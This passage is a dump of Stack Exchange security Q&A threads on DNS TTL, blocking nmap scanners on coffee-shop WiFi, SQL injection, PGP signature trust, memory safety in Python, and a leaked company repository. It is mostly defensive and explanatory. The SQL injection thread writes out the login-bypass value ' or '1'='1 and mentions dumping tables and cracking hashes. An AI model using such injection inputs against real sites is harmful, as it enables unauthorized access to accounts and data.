<p><strong>SOA Minimum TTL.</strong> OK. Minimum TTL value is <strong>86400</strong>. Recommended values [3600 .. 86400] (1 hour ... 1 day). Minimum TTL was redefined in RFC 2308, now it defines the period of time used by slaves to cache negative responses.</p>
</blockquote>
<p>This made me wonder if the TTL value has any influence on information security. The only thing related to information security that I could think of is <a href=""https://en.wikipedia.org/wiki/Disaster_recovery"" rel=""nofollow noreferrer"">disaster recovery (DR)</a> in the sense of  <strong>availability</strong> (<a href=""https://en.wikipedia.org/wiki/Information_security#Key_concepts"" rel=""nofollow noreferrer"">CIA triad</a>). From the <a href=""https://en.wikipedia.org/wiki/Time_to_live#DNS_records"" rel=""nofollow noreferrer"">Time to live (TTL) Wikipedia article</a>:</p>
<blockquote>
<p>Newer DNS methods that are part of a <strong>disaster recovery (DR)</strong> system may have some records deliberately set extremely low on TTL. For example, a 300-second TTL would help key records expire in 5 minutes to help ensure these records are flushed quickly worldwide. This gives administrators the ability to edit and update records in a timely manner. TTL values are &quot;per record&quot; and setting this value on specific records is sometimes honored automatically by all standard DNS systems worldwide. However, a problem persists in that some caching DNS nameservers set their own TTLs regardless of the authoritative records, thus it cannot be guaranteed that all downstream DNS servers have the new records after the TTL has expired.</p>
</blockquote>
<p>In short: Does the Time-To-Live (TTL) value of DNS records (or SOA records in particular) have any security implications? What is safer having a value being too high or too low and what are the pros and cons of that security wise?</p>
<p>Related interesting article: <a href=""https://techblog.bozho.net/short-dns-ttl-and-centralization-are-serious-risks-for-the-internet/"" rel=""nofollow noreferrer"">Short DNS record TTL and centralization are serious risks for the internet</a></p>
","0","3","261319","<p><strong>It's a double-edged sword.</strong></p>
<p>If you make your TTL shorter, and your DNS provider has an outage: Clients won't be able to resolve your DNS after the TTL times out, so they won't be able to find your server.</p>
<p>If you make your TTL longer, and your data center has an outage: Pivoting to a backup server at another data center won't help, because clients will still be resolving to the cached DNS records that point to your primary servers at the data center where there is an outage.</p>
","1"
"261310","261310","Identification of a laptop using a spoofed WiFi MAC address","<p>I own a small coffee shop in a highly-populated area. We've noticed that several computers are connecting to our WiFi network using spoofed MAC addresses (e.g. 11:22:33:44:55:66). Is there <em>any</em> way of identifying these machines? Is there any way to determine who these users are? I've been manually blocking these MAC addresses but they just create new addresses.</p>
<hr />
<p>Why do we block them? Because we've been notified by our ISP that these devices are using our WiFi to perform nmap scans. They aren't just &quot;browsing&quot;, they're using our account to find open ports on machines all over the net.</p>
","25","4","261321","<p>Detecting and blocking spoofed MAC addresses is a losing game. As Toni pointed out, the attackers could just start copying MAC addresses of real devices so you would have no practical way to stop them. In fact, it would just lead to denial of service for some of your legitimate customers.</p>
<p>Instead, you could configure a firewall on the router to block outgoing connections to all ports except port 53 (DNS), 80 (HTTP) and 443 (HTTPS)*. This way, most of your regular customers will be able to continue browsing normally, and your wifi will be useless for people attempting nmap scans.</p>
<hr />
<p><sup>*You might also want to allow <a href=""https://www.networkinghowtos.com/howto/common-vpn-ports-and-protocols/"" rel=""noreferrer"">common VPN ports</a>, since a lot of people tend to use a VPN on public WiFis. Of course, this means people will be able to conduct nmap scans from your WiFi over VPN, but in that case,  it should be the VPN providers headache.</sup></p>
","52"
"261310","261310","Identification of a laptop using a spoofed WiFi MAC address","<p>I own a small coffee shop in a highly-populated area. We've noticed that several computers are connecting to our WiFi network using spoofed MAC addresses (e.g. 11:22:33:44:55:66). Is there <em>any</em> way of identifying these machines? Is there any way to determine who these users are? I've been manually blocking these MAC addresses but they just create new addresses.</p>
<hr />
<p>Why do we block them? Because we've been notified by our ISP that these devices are using our WiFi to perform nmap scans. They aren't just &quot;browsing&quot;, they're using our account to find open ports on machines all over the net.</p>
","25","4","261332","<p><strong>This is a theoretical technique</strong> and may not be practical without putting in sufficient effort to develop and test your own detection tool. I'm leaving this here because it <em>is</em> a possible technique and it works.</p>
<p>You may be able to fingerprint the MAC address, and in some cases, even discover the original, unspoofed address. This would allow you to match two spoofed MAC addresses as belonging to the same machine, and apply a block to that new MAC address. From <a href=""https://papers.mathyvanhoef.com/asiaccs2016.pdf"" rel=""nofollow noreferrer"">a research paper on the subject</a>:</p>
<blockquote>
<p>We present several novel techniques to track (unassociated)
mobile devices by abusing features of the Wi-Fi standard.
This shows that using random MAC addresses, on its own,
does not guarantee privacy.</p>
<p>First, we show that information elements in probe requests
can be used to fingerprint devices. We then combine these
fingerprints with incremental sequence numbers, to create
a tracking algorithm that does not rely on unique identifiers such as MAC addresses. Based on real-world datasets,
we demonstrate that our algorithm can correctly track as
much as 50% of devices for at least 20 minutes. We also
show that commodity Wi-Fi devices use predictable scrambler seeds. These can be used to improve the performance of
our tracking algorithm. Finally, we present two attacks that
reveal the real MAC address of a device, even if MAC address randomization is used. In the first one, we create fake
hotspots to induce clients to connect using their real MAC
address. The second technique relies on the new 802.11u
standard, commonly referred to as Hotspot 2.0, where we
show that Linux and Windows send Access Network Query
Protocol (ANQP) requests using their real MAC address.</p>
</blockquote>
","10"
"261310","261310","Identification of a laptop using a spoofed WiFi MAC address","<p>I own a small coffee shop in a highly-populated area. We've noticed that several computers are connecting to our WiFi network using spoofed MAC addresses (e.g. 11:22:33:44:55:66). Is there <em>any</em> way of identifying these machines? Is there any way to determine who these users are? I've been manually blocking these MAC addresses but they just create new addresses.</p>
<hr />
<p>Why do we block them? Because we've been notified by our ISP that these devices are using our WiFi to perform nmap scans. They aren't just &quot;browsing&quot;, they're using our account to find open ports on machines all over the net.</p>
","25","4","261359","<p>Just use authentication like a great deal of local coffee shops here do.</p>
<p>Their usual strategy is to change the password every day and post it on a note near the cash desk. Or print it on the receipts. Or give it on request.</p>
<p>This way they weed out the bandwidth abusers that are not their clients, but also the malicious users.</p>
<p>Annoying, but also safer and brings a better experience to the legitimate users who don't share the bandwidth with the nearby leechers.</p>
","18"
"261310","261310","Identification of a laptop using a spoofed WiFi MAC address","<p>I own a small coffee shop in a highly-populated area. We've noticed that several computers are connecting to our WiFi network using spoofed MAC addresses (e.g. 11:22:33:44:55:66). Is there <em>any</em> way of identifying these machines? Is there any way to determine who these users are? I've been manually blocking these MAC addresses but they just create new addresses.</p>
<hr />
<p>Why do we block them? Because we've been notified by our ISP that these devices are using our WiFi to perform nmap scans. They aren't just &quot;browsing&quot;, they're using our account to find open ports on machines all over the net.</p>
","25","4","261438","<p>Based on your updated question, this is a classic case of an <a href=""https://meta.stackexchange.com/questions/66377/what-is-the-xy-problem"">XY problem</a>. Specifically, what you really want here is to stop people engaging in abusive activity on your internet link, they just happen to be using spoofed MAC addresses to do this.</p>
<p>Blocking spoofed MAC addresses won’t actually stop anybody from engaging in abusive activity, and it may actually block legitimate customers (most devices these days support MAC randomization, where they use a randomly selected spoofed MAC address for each unique network they connect to to prevent tracking, and it is becoming increasingly common for this to be enabled by default).</p>
<p>The correct approach here is to block the abusive behavior. There are a couple of ways you can do this:</p>
<ul>
<li>Limit which ports you actually allow connections to. This only partially solves the problem (because people could still just abuse those ports you allow through), and runs the risk of preventing otherwise legitimate usage of your network, so I really would not recommend this approach, but it’s also the easiest to implement.</li>
<li>Make it difficult for people who are not actual customers to use your WiFi. Change the password regularly, and then only provide it on receipts or somewhere else that someone who is not a customer could not easily check. This will prevent somebody from sitting in a car on the street in front of your store from readily using your WiFi, which will significantly disincentivize abusive behavior (because the perpetrators will have to actually come into the store), and is generally a good idea anyway (as it will also disincentivize people using your WiFi to attack your customers systems for the same reasons).</li>
<li>Use a captive portal setup requiring some initial manual interaction before a system can access the internet. These are relatively normal at many businesses for public WiFi, and will trivially shut down many opportunistic attackers (because they won’t take the time to work around it). In some places, if done correctly, this can also be used to at least partially waive your legal liability for any activity your customers take online by presenting appropriate terms of service to the user and requiring them to accept it to connect.</li>
<li>Limit the rate at which new connections can be established. Ideally in such a way that a given client can establish a few dozen all at once, and then after that is limited to something much lower, such as 1-2 per second (this is trivial to implement on any Linux or FreeBSD based firewall system). This will effectively shut down port scanning  without significantly disrupting legitimate usage, because port scanning is only practical if it can be done quickly, and doing it quickly means hundreds or thousands of new connections per second, but 99% of legitimate usage only needs a small burst of a dozen or so new connections every now and then.</li>
<li>Use an active detection system, such as <a href=""http://cipherdyne.org/psad/"" rel=""nofollow noreferrer"">psad</a>, and leverage the logging from that to actively block such activity. This is the most complicated option to implement, but if done right will also result in the least disruption to legitimate usage.</li>
</ul>
","3"
"261267","261267","What account do you enter when using ' or '1'='1?","<p>So I'm writing a paper on sql injection for my db class and one thing I don't understand is this.</p>
<p>I assumed that one of the reasons a lot of sites don't allow duplicate usernames is that they use usernames as primary key and that's why a login using SELECT only has one result for it to work. But what happens when they are multiple results? I'm assuming (lots of assumptions on my part lol) that in a site that isn't vulnerable to sql injection it would just give an error and not work but in a site that is vulnerable to it'll work but when there's multiple results from ' or '1'='1 what account does it log into? is it just the very first result in the table?</p>
","1","3","261268","<p>Well-crafted sites do not use usernames as primary keys (<a href=""https://stackoverflow.com/questions/1825613/is-it-bad-to-use-user-name-as-primary-key-in-database-design"">see this SO question</a>), however they do use keys to search. Perhaps <a href=""https://www.w3schools.com/sql/sql_injection.asp"" rel=""nofollow noreferrer"">read up</a> on how basic SQL injection works, and you'll find that <code>'OR '1'='1</code> returns all rows from the queried table (and doesn't log into any accounts; you'd need a password or a different attack such as forging an authentication token). In theory once the table is dumped, you can hope that the passwords were stored in plaintext and log into an account of choice, or attempt to bruteforce the hashes to gain login credentials. Also, once you realize that a site is vulnerable to SQLi, you can your SQL injection attack to dump more data by bruteforcing table names. Good luck on your paper.</p>
","2"
"261267","261267","What account do you enter when using ' or '1'='1?","<p>So I'm writing a paper on sql injection for my db class and one thing I don't understand is this.</p>
<p>I assumed that one of the reasons a lot of sites don't allow duplicate usernames is that they use usernames as primary key and that's why a login using SELECT only has one result for it to work. But what happens when they are multiple results? I'm assuming (lots of assumptions on my part lol) that in a site that isn't vulnerable to sql injection it would just give an error and not work but in a site that is vulnerable to it'll work but when there's multiple results from ' or '1'='1 what account does it log into? is it just the very first result in the table?</p>
","1","3","261269","<h2>TL;DR</h2>
<p><a href=""https://en.wikipedia.org/wiki/SQL_injection"" rel=""nofollow noreferrer"">SQL injection</a> is really more about allowing arbitrary user data to be interpolated into strings, where it can then affect the SQL query that's executed. It's not really about primary keys or the use of usernames as primary keys, so the question itself is likely based on a false premise.</p>
<h2>Usernames and Primary Keys</h2>
<p>This kind of question my be more on topic on <a href=""https://dba.stackexchange.com/"">DBA Stack Exchange</a> or <a href=""https://stackoverflow.com/"">Stack Overflow</a> if it's language- or <a href=""https://en.wikipedia.org/wiki/Object%E2%80%93relational_mapping"" rel=""nofollow noreferrer"">ORM</a>-specific, but the triple-net is that usernames:</p>
<ol>
<li>Should enforce a uniqueness constraint if you're using them as primary keys, because a primary key (whether singular or composite) <em>must</em> be unique.</li>
<li>Are often better implemented as fields where the primary key is an auto-incrementing field or a <a href=""https://en.wikipedia.org/wiki/Universally_unique_identifier"" rel=""nofollow noreferrer"">UUID</a>, depending on how you plan to use it. <em>NB: integers tend to be easier to use for numeric IDs, but a lot depends on your architecture, data retrieval strategy, and your specific use cases.</em></li>
</ol>
<p>Also, note that not all sites use the &quot;username&quot; as a unique handle or identifier. As an example, there's nothing stopping multiple people on LinkedIn or Stack Exchange from having the same first and last names, so the identifier needs to be something else such as an email address—the email address is presumed to be unique, although people <em>could</em> theoretically use group mailboxes or email lists—or some other username/handle which is then mapped to a numeric ID.</p>
<p>The latter is what Stack Exchange does. Your username and password are for authentication purposes, but you can change your username, email address, or other aspects of your account because your <strong><em>real</em> identity within the system</strong> is a (generally site-specific) numeric ID rather than the email address you use to login. Since many aspects of your account could change, using your email address or username (with or without a uniqueness constraint) wouldn't necessarily allow you to be uniquely identified by the system if that data changed.</p>
<p>Currently, your handle of &quot;Parnes&quot; is mapped to <a href=""https://security.stackexchange.com/users/277041"">user:277041</a>, where <code>277041</code> is presumably the unique and immutable primary key under which your username, password, and other data can be looked up by the system. You can change most of your data, but the user ID of <code>277041</code> will follow you around as a unique identifier. Without internal knowledge of the SE databases, I can't say for sure that it's the primary key, but for practical purposes you can treat it as one.</p>
<h2>Preventing SQL Injection</h2>
<p>This is a broad topic, but in general preventative solutions include treating all user input as tainted, validating and sanitizing user input or mutable system data before running a query, and using templates with sanitized or escaped variables rather than standard strings for executing queries.</p>
<p>This list is not meant to be exhaustive, and entire books have been written about topic. However, this will at least provide you a starting point.</p>
<h2>See Also</h2>
<ul>
<li><a href=""https://guides.rubyonrails.org/security.html#sql-injection="" rel=""nofollow noreferrer"">Ruby on Rails Security Guide § 7.2</a></li>
<li><a href=""https://docs.microsoft.com/en-us/sql/relational-databases/security/sql-injection?view=sql-server-ver15"" rel=""nofollow noreferrer"">MS SQL Server 2019: SQL Injection</a></li>
<li>The <a href=""https://sqlmap.org/"" rel=""nofollow noreferrer"">sqlmap</a> penetration testing tool</li>
</ul>
","1"
"261267","261267","What account do you enter when using ' or '1'='1?","<p>So I'm writing a paper on sql injection for my db class and one thing I don't understand is this.</p>
<p>I assumed that one of the reasons a lot of sites don't allow duplicate usernames is that they use usernames as primary key and that's why a login using SELECT only has one result for it to work. But what happens when they are multiple results? I'm assuming (lots of assumptions on my part lol) that in a site that isn't vulnerable to sql injection it would just give an error and not work but in a site that is vulnerable to it'll work but when there's multiple results from ' or '1'='1 what account does it log into? is it just the very first result in the table?</p>
","1","3","261281","<p>When its vulnerable to this exploit, then in most cases you are logged in as the first user that stands in the database.</p>
","1"
"261213","261213","Why trust a PGP signature if it is distributed along with the data being verified?","<p>Many downloads offer an OpenPGP signature, which can be used to verify the file, but if a hacker manages to manipulate the file, then he can also simply change the signature key, or not?</p>
","7","4","261214","<blockquote>
<p>if a hacker manages to manipulate the file, then he can also simply change the signature key, or not?</p>
</blockquote>
<p>Usually the file is generated on a build system, and this file is most of the time sent to a CDN. The site usually will have an automated process to grab the signature from the backend and create a download page, linking the file and the signature.</p>
<p>So while it's possible to a hacker to compromise both the file and the signature, this is not easily done. The build site is usually more guarded than the website, and the CDN is usually heavy guarded too.</p>
","1"
"261213","261213","Why trust a PGP signature if it is distributed along with the data being verified?","<p>Many downloads offer an OpenPGP signature, which can be used to verify the file, but if a hacker manages to manipulate the file, then he can also simply change the signature key, or not?</p>
","7","4","261215","<p>The signature can be changed, yes, but it won't be valid unless the attacker can get you to download <em>their</em> public key instead of the one you intend to download. This is where checking the PGP fingerprint comes in. The fingerprint can be given to you <a href=""https://en.wikipedia.org/wiki/Out-of-band"" rel=""nofollow noreferrer"">through another channel</a>, and compromising all possible places one could find the legitimate fingerprint is much more difficult than compromising the signature.</p>
<p>For example, my fingerprint is <code>BCBAE3E9CB8E2FE23F29DC58061D7CAC428DD60B</code>. All you have to do is download my public key and verify the fingerprint <a href=""https://en.wikipedia.org/wiki/Trust_on_first_use"" rel=""nofollow noreferrer"">once</a> and you'll be able to detect modification of any signatures that were made by me. The worst an attacker with control of the signature and data being signed then is a rollback attack, where the attacker presents an older pair of data and signature. Even this can be prevented by checking the dates on the signature to make sure they're expected. Some signatures, such as <a href=""https://riseup.net/en/canary"" rel=""nofollow noreferrer"">Riseup's warrant canary</a>, also provide a link to a current news article to establish that the signature has not been pre-generated. A <a href=""https://crypto.stackexchange.com/q/12647/54184"">time stamp authority</a> would also work.</p>
","12"
"261213","261213","Why trust a PGP signature if it is distributed along with the data being verified?","<p>Many downloads offer an OpenPGP signature, which can be used to verify the file, but if a hacker manages to manipulate the file, then he can also simply change the signature key, or not?</p>
","7","4","261222","<p>A lot of downloads will come with something like an unsigned SHA-1 checksum. You might reasonably ask what the benefit of that is, since if that was tampered with the attacker could just recalculate the checksum. The benefit here is that you should get the checksum from a trustworthy source, such as directly from the developer's website. That way you can download from (say) a torrent, or a local mirror that you don't entirely trust and have a means of verifying that the download hasn't been tampered with.</p>
<p>Using a PGP signature takes things to the next level, because whilst you can always tamper with the file and then sign it, you cannot sign it with the developer's signature, unless you know their private key (code signing key compromises <a href=""https://www.bleepingcomputer.com/news/security/malware-now-using-nvidias-stolen-code-signing-certificates/"" rel=""noreferrer"">do happen</a> from time to time).</p>
<p>So, how do you verify the signer? Usually you have to find somewhere you trust and store the key from there. In principle, you only have to do the verification step once. So if you look at: <a href=""https://www.kernel.org/signature.html"" rel=""noreferrer"">https://www.kernel.org/signature.html</a> you can see that Linus' key fingerprint is &quot;ABAF 11C6 5A29 70B1 30AB  E3C4 79BE 3E43 0041 1886&quot;. You can also see that you absolutely <strong>shouldn't</strong> trust the key with fingerprint &quot;C75D C40A 11D7 AF88 9981  ED5B C86B A06A 517D 0F0E&quot;, so &quot;verify once but check for revocations&quot;.</p>
","5"
"261213","261213","Why trust a PGP signature if it is distributed along with the data being verified?","<p>Many downloads offer an OpenPGP signature, which can be used to verify the file, but if a hacker manages to manipulate the file, then he can also simply change the signature key, or not?</p>
","7","4","261235","<h2>Verifying Keys Using Fingerprints or the Web-of-Trust</h2>
<p>OpenPGP is difficult for many people to use because of the authentication issue you're describing. In general, you should only trust keys that are:</p>
<ol>
<li>received from a trusted source such as your organization's official public keyring; or</li>
<li>validated out of band, such as by comparing the key's fingerprint over the phone with the person who owns the key; or</li>
<li>signed by a fully-trusted key, or by a sufficient number of partially-trusted keys.</li>
</ol>
<p><em>NB: Some newer keyservers such as hkps://keys.openpgp.org now <a href=""https://keys.openpgp.org/about/faq#third-party-signatures"" rel=""nofollow noreferrer"">strip out third-party signatures</a>, so the trusted-keys option may or may not be useful to you if you are relying on them for web-of-trust purposes.</em></p>
<h2>When You Don't Have Direct Access to the Key Owner or a Web-of-Trust</h2>
<p>As a purely practical matter, many people treat fingerprint information from HTTPS servers or services like Keybase to validate a key for their OS distribution or software packages as &quot;good enough.&quot; Whether or not that is sufficient for <em>your</em> unique purposes, policies, or standards is a separate issue, but it is often good enough for users of operating systems like <a href=""https://www.debian.org/CD/verify"" rel=""nofollow noreferrer"">Debian</a> or <a href=""https://ubuntu.com/tutorials/how-to-verify-ubuntu#1-overview"" rel=""nofollow noreferrer"">Ubuntu</a> to validate their OS and keyrings. Your mileage may vary.</p>
<h2>See Also</h2>
<ul>
<li><a href=""https://gnupg.org/download/integrity_check.html"" rel=""nofollow noreferrer"">GnuPG Integrity Check</a></li>
<li><a href=""https://gnupg.org/signature_key.html"" rel=""nofollow noreferrer"">GnuPG Signature Keys</a></li>
<li><a href=""https://wiki.gnupg.org/WebOfTrust"" rel=""nofollow noreferrer"">Web of Trust</a></li>
<li><a href=""https://www.gnupg.org/gph/en/manual/x547.html"" rel=""nofollow noreferrer"">Building Your Web of Trust</a></li>
<li>The GPG <code>--fingerprint</code> flag (see <a href=""https://www.gnupg.org/documentation/manpage.html"" rel=""nofollow noreferrer"">man 1 gpg</a>)</li>
</ul>
","0"
"261171","261171","Do high level languages allow for buffer / heap overflow?","<p>I'm learning about basic x86 overflows in C but normally I code with Python. Is there anyway that programs written in higher level languages can suffer from buffer/heap overflow?</p>
","20","6","261173","<p>Overflows don't occur in a language, they occur in a process. Specifically, a &quot;buffer overflow&quot; occurs when memory is allocated on the stack and the program writes outside that memory and into following memory.</p>
<p>Even on a language like Python or C#, such things could happen in theory. However, the runtimes those languages are based on will ensure that most of these scenarios don't happen. Consider the following python code:</p>
<pre><code>cars = [&quot;Ford&quot;, &quot;Volvo&quot;, &quot;BMW&quot;]
cars[3] = &quot;Mazda&quot;
</code></pre>
<p>This will print the following error:</p>
<pre><code>Traceback (most recent call last):
  File &quot;main.py&quot;, line 2, in &lt;module&gt;
    cars[3] = &quot;Mazda&quot;
IndexError: list assignment index out of range
</code></pre>
<p>So instead of just overwriting some memory, the runtime caught that <code>cars</code> only had three elements and writing to a fourth element is therefore forbidden.</p>
<p>That seems like overflows are impossible, right? Well, not exactly. The python runtime itself is just a process and thus susceptible to all kinds of vulnerabilities, including buffer overflows.</p>
<p>For example, <a href=""https://www.cvedetails.com/cve/CVE-2021-3177/"" rel=""noreferrer"">CVE-2021-3177</a> has been found last year and has the following summary:</p>
<blockquote>
<p>Python 3.x through 3.9.1 has a buffer overflow in PyCArg_repr in _ctypes/callproc.c, which may lead to remote code execution in certain Python applications that accept floating-point numbers as untrusted input, as demonstrated by a 1e300 argument to c_double.from_param. This occurs because sprintf is used unsafely.</p>
</blockquote>
<p>Now, how to interpret this is a matter of semantics. One could say Python <em>is</em> vulnerable to overflows, because you could write a python program that causes a buffer overflow. Or you could say it's <em>not</em> vulnerable to overflows, because the overflow itself actually occurred in a C program, which just happens to be interpreting python code.</p>
<hr />
<p>The short answer is this:</p>
<p>High-level languages generally guard against such vulnerabilities, but the underlying runtimes of these programs are still vulnerable.</p>
","39"
"261171","261171","Do high level languages allow for buffer / heap overflow?","<p>I'm learning about basic x86 overflows in C but normally I code with Python. Is there anyway that programs written in higher level languages can suffer from buffer/heap overflow?</p>
","20","6","261190","<p>&quot;level&quot; of a programming languages is not a particularly well-defined concept.</p>
<p>C++ for example would generally be regarded as a higher-level language then C but it still leaves the user open to the same memory safety problems, including buffer overflows, that C suffers from.</p>
<p>Python on the other hand does try to protect it's users from such mistakes, the regular python programmer never sees a raw pointer, they only see reference counted object references, the standard python collection objects are protected against overflows.</p>
<p>Still, there are ways to create buffer overflows in python. In particular there is a module in the standard library called &quot;ctypes&quot;. The intended use of these functions are to allow interoperability with C code, but in order to do so they must provide mechanisms to work with C style raw pointers which cannot have bounds checking applied.</p>
<p>For example I was able to produce a segmentation fault with the following python code.</p>
<pre><code>from ctypes import *
pointer(c_char(b'a'))[10000000]
</code></pre>
<p>That is a contrived example but because python is a relatively slow language, most python code calls into code written in other languages, most commonly C and C++ to do the &quot;heavy lifting&quot;. Buffer overflows can happen either in the C and C++ libraries themselves or in the glue code (which may be written in either C or python) that interfaces between python and C.</p>
<p>In an extreme case a hastily written glue code could even return something like a ctypes pointer object to the end user's python code.</p>
","15"
"261171","261171","Do high level languages allow for buffer / heap overflow?","<p>I'm learning about basic x86 overflows in C but normally I code with Python. Is there anyway that programs written in higher level languages can suffer from buffer/heap overflow?</p>
","20","6","261205","<p>I mean, yeah, yes they can overflow, I guess. It rarely happens, though. One needs to work his/her behind quite a lot to achieve such runtime errors, compared to what would be needed to cause such disruption in C. Language could protect you from those, but you could always find a sufficiently non-obvious way to cause infinite recursion or something similar that would cause the whole language to overflow. Moral of this is, no language is completely safe from overflows: Python, C#, Java (including its derivative script version) Django... all of those are pretty safe, but not 100% of the time.</p>
","-1"
"261171","261171","Do high level languages allow for buffer / heap overflow?","<p>I'm learning about basic x86 overflows in C but normally I code with Python. Is there anyway that programs written in higher level languages can suffer from buffer/heap overflow?</p>
","20","6","261210","<p>tl;dr: (most) high-level languages specifically protect you from that, but a very rare bug could make those protections fail.</p>
<p>Long version:</p>
<p>High-level languages are (generally) designed as not to allow intentional or unintentional buffer/heap overflows (among other things that could represent vulnerabilities or could lead a programmer to introduce a bug). But in the end there is always some low-level language involved, so the only thing protecting you is the high-level language's design.</p>
<p>This is because in the end these high-level languages will end up compiling, transpiling or translating your code to a lower-level language that does allow buffer/heap overflows, and/or your code (as is or compiled, transpiled or translated to another high-level language that also doesn't allow buffer/heap overflows) will end up running in another program (such as the JVM for Java) that is written in a language that does allow buffer/heap overflows (or at some point something is running at a low enough level to allow this).</p>
<p>We typically use very well-tested tools for 99.9% of what we do with 99.9% of high-level languages, but nobody can't guarantee that there is not a 0-day vulnerability in one of these tools that could allow you or a malicious actor to create a buffer/heap overflow, against the language's specific design and intent. This risk increases if you use less-tested tools (for whatever reason, though in my experience this is VERY uncommon), but it shouldn't be significant.</p>
<p>Note: I wrote this as if tools like the JVM or the Java compiler were a single tool that's part of the Java language (and the analogous for other high-level languages). This is technically not true, there are many distributions of these tools, and neither of them is a part of the language itself, but they are a part of the language ecosystem and they are (almost always) needed for the language to be used and useful. A vulnerability in the Java compiler and/or the JVM could lead to a buffer/heap overflow and technically it wouldn't be in the Java language itself, but I think you were asking in general, not caring about the specific distinction between the language and the tools that make it useful.</p>
","2"
"261171","261171","Do high level languages allow for buffer / heap overflow?","<p>I'm learning about basic x86 overflows in C but normally I code with Python. Is there anyway that programs written in higher level languages can suffer from buffer/heap overflow?</p>
","20","6","261217","<p>The property you are looking for is called &quot;memory safety&quot;, meaning that all memory access is well-typed and within bounds.</p>
<p>Most high-level programming languages are specified to provide memory safety. Failure to live up to this promise would be a bug in the language implementation.</p>
<p>Obviously this guarantee does not extend to code written in unsafe languages, even if you load and invoke that code from a memory-safe language.</p>
<p>Also, note that &quot;well-typed&quot; is defined with respect to the type system of the programming language. If you have constraints beyond that, you must check those yourself. For instance, if you were to write a class &quot;heap&quot; backed by one huge array where programmers can store &quot;logical objects&quot;, the runtime would check accesses with respect to the bounds of that array, not the bounds of the &quot;logical object&quot; therein.</p>
","2"
"261171","261171","Do high level languages allow for buffer / heap overflow?","<p>I'm learning about basic x86 overflows in C but normally I code with Python. Is there anyway that programs written in higher level languages can suffer from buffer/heap overflow?</p>
","20","6","261219","<p>For C and C++, for faster code, most release builds do not include bounds checking on indexes or pointers (debug builds will check for this), making it possible to access just about anything within a process address space.</p>
<p>Back in the 1970s, there was a version of APL called APL/SV (shared variables) that ran in supervisor mode on an IBM mainframe. There were several ways to glitch a user's work area so that the data for one array included the control information for a second array, allowing the second array size to be set to the entire address space of the mainframe, allowing for read and write to any location on the mainframe. When not being abused, APL/SV allowed variables to be shared between users (similar to shared memory between processes on modern systems), which allowed for multiplayer games like Battleship or some type of space war game.</p>
","0"
"261168","261168","Employee uploaded proprietary private repository on his github public account","<p>A newly joined software engineer in our organization uploaded one of company's proprietary git repository on his personal Github public account, likely without nefarious intent.</p>
<p>How do I ensure this won't happen again in future? Apart from formal code of conducts, signing NDA etc. Are there any technical measures that can help (like firewalls etc)?</p>
","0","3","261174","<p>Depending on the size of the organization, you can do things like purchase a Cloud Proxy solution. ZScaler, McAfee and there are others. Various cloud proxies often install an agent on the desktop that redirects web requests out through a cloud from individual machines. Once those requests go out through the cloud you can enforce policies as to whether the user can browse too... and block things. So one of the things you could deny access to is public or private github instances. That's one solution there are others.</p>
","-1"
"261168","261168","Employee uploaded proprietary private repository on his github public account","<p>A newly joined software engineer in our organization uploaded one of company's proprietary git repository on his personal Github public account, likely without nefarious intent.</p>
<p>How do I ensure this won't happen again in future? Apart from formal code of conducts, signing NDA etc. Are there any technical measures that can help (like firewalls etc)?</p>
","0","3","261181","<h2>TL;DR</h2>
<p>Address the issue within your current incident response process. Then do a post-mortem to see if there were any additional controls that may have been applicable and could be implemented in the future.</p>
<p>Additionally, since the original question was edited—the original post posited an intentional breach by an active internal threat actor—it's worth noting that:</p>
<ol>
<li>Education and awareness training are certainly useful tools in communicating about the security program.</li>
<li>Opening a dialog is always a great way of exploring the root cause of a breach, especially an unintentional one</li>
</ol>
<p>but neither is operationally effective as an automatable detective or preventative control. While tools can't substitute for human judgment, human beings are often the weakest link in continuous operational enforcement. That is why continuously-operating automated controls to enforce policies and standards are often more effective in addressing this kind of accidental exfiltration issue than policies, non-disclosure agreements, or routine awareness training.</p>
<h2>Reframing the Issue</h2>
<p>This isn't really &quot;data leakage&quot; as the original post (before it was edited) expressed it. This is really more within the domain of applying appropriate controls to your source code management system, as well as endpoint protection and data loss prevention (DLP) on your company-owned equipment.</p>
<p>If you're allowing people to use their own equipment, then you may have to apply other compensating controls, but the bottom line is that while you can <em>limit</em> accidental exposure you can never completely eliminate the risk of deliberate exposure from an active threat actor. That's just the reality of the information security domain.</p>
<h2>GitHub-Specific Controls</h2>
<p>Per GitHub's page on <a href=""https://docs.github.com/en/pull-requests/collaborating-with-pull-requests/working-with-forks/about-forks"" rel=""nofollow noreferrer"">inherited fork permissions</a>:</p>
<blockquote>
<p>Private forks inherit the permissions structure of the upstream or parent repository. This helps owners of private repositories maintain control over their code. For example, if the upstream repository is private and gives read/write access to a team, then the same team will have read/write access to any forks of the private upstream repository. Only team permissions (not individual permissions) are inherited by private forks.</p>
</blockquote>
<p>There is also a page dedicated to explaining how to <a href=""https://docs.github.com/en/organizations/managing-organization-settings/managing-the-forking-policy-for-your-organization"" rel=""nofollow noreferrer"">manage the forking policy for private repositories hosted by an organization</a> or for <a href=""https://docs.github.com/en/repositories/managing-your-repositorys-settings-and-features/managing-repository-settings/managing-the-forking-policy-for-your-repository"" rel=""nofollow noreferrer"">specific repositories</a>.</p>
<p>If you haven't set any controls on your organization's repositories, or your repositories are public, then focus on implementing those controls. If you have already implemented those controls, then you need to re-evaluate your threat model and design operationally-effective controls that address your real workflow. You may even need to change your workflows if adequate controls can't be applied.</p>
<p>Just remember that no individual control or set of controls is 100% guaranteed. You are <em>mitigating</em> risk by applying appropriate controls. There's no such thing as perfect security, especially when faced with deliberate insider threats or a failure to apply basic controls in the first place.</p>
<h2>Public Repository Scanning</h2>
<p>While not really a preventative control, you might also consider applying detective controls such as scanning publicly-accessible code repositories on sites like GitHub or GitLab for specific SHAs, either directly or via a search engine. That won't <em>prevent</em> people from making a private repository public, but it can at least provide some insight into whether a specific commit, blob, or tree is publicly available.</p>
<p>For example, given a recent commit on the <a href=""https://github.com/ruby/ruby/tree/ruby_3_1"" rel=""nofollow noreferrer"">Ruby 3.1 branch</a>, you might search for the short or long SHA of the commit like so:</p>
<ul>
<li><a href=""https://github.com/search?q=53f5fc4"" rel=""nofollow noreferrer"">53f5fc4</a></li>
<li><a href=""https://github.com/search?q=53f5fc4236a754ddf94b20dbb70ab63bd5109b18"" rel=""nofollow noreferrer"">53f5fc4236a754ddf94b20dbb70ab63bd5109b18</a></li>
</ul>
<p>Finding a good search on search engines (which may treat SHA hashes as stopwords or otherwise choose not to index them) is harder, but one supposes it would be possible if you invest the time. However, even within Git web-based user interfaces there are lots of caveats to this type of approach, including (but not limited to):</p>
<ol>
